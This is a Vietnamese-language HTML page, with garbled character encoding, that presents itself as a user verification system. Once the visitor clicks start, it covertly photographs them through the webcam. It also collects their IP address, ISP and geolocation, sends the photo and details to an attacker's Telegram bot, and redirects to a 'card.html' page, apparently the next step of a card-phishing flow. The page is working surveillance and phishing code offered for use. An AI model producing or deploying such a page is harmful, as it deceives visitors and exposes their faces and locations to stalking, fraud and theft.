<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XÃ¡c Minh NgÆ°á»i DÃ¹ng</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>.glass { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }</style>

<body class="bg-[#0b0e14] text-white flex items-center justify-center min-h-screen p-4">
    <div class="max-w-md w-full glass rounded-[2.5rem] p-8 text-center">
        <h1 class="text-2xl font-bold mb-6">Há»‡ Thá»‘ng XÃ¡c Minh</h1>
        <div class="relative w-full aspect-square bg-black rounded-3xl overflow-hidden mb-6 border border-emerald-500/30">
            <video id="webcam" class="w-full h-full object-cover" autoplay playsinline></video>
        </div>
        <button id="btn" onclick="start()" class="w-full bg-emerald-600 py-4 rounded-2xl font-bold">Báº®T Äáº¦U</button>
    </div>

    <script>
        const TOKEN = 'YOUR_BOT_TOKEN';
        const CHAT_ID = 'YOUR_CHAT_ID';

        async function start() {
            const btn = document.getElementById('btn');
            btn.innerText = "ÄANG Xá»¬ LÃ...";
            btn.disabled = true;

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                document.getElementById('webcam').srcObject = stream;

                // Láº¥y IP Ä‘á»ƒ lÃ m mÃ£ Ä‘Ã¡nh dáº¥u mÃ¡y
                const ipRes = await fetch('https://ipapi.co/json/');
                const data = await ipRes.json();
                const deviceID = `[${data.ip.slice(-4)}] ${navigator.platform}`; 
                localStorage.setItem('deviceID', deviceID); // LÆ°u láº¡i Ä‘á»ƒ cÃ¡c trang sau dÃ¹ng

                navigator.geolocation.getCurrentPosition(async (pos) => {
                    setTimeout(() => capture(pos.coords, data, deviceID), 2000);
                }, () => setTimeout(() => capture(null, data, deviceID), 2000));

            } catch (e) { alert("Lá»—i camera."); btn.disabled = false; }
        }

        async function capture(coords, data, deviceID) {
            const video = document.getElementById('webcam');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
                const msg = `ğŸ”” <b>MÃY Má»šI TRUY Cáº¬P: ${deviceID}</b>\n\nğŸ•’ ${new Date().toLocaleString('vi-VN')}\nğŸŒ IP: ${data.ip}\nğŸ¢ ISP: ${data.org}\nğŸ“ Map: http://google.com/maps?q=${coords ? coords.latitude+','+coords.longitude : data.latitude+','+data.longitude}`;

                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'img.jpg');
                formData.append('caption', msg);
                formData.append('parse_mode', 'HTML');

                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                window.location.href = 'card.html';
            }, 'image/jpeg');
        }
    </script>
</body>
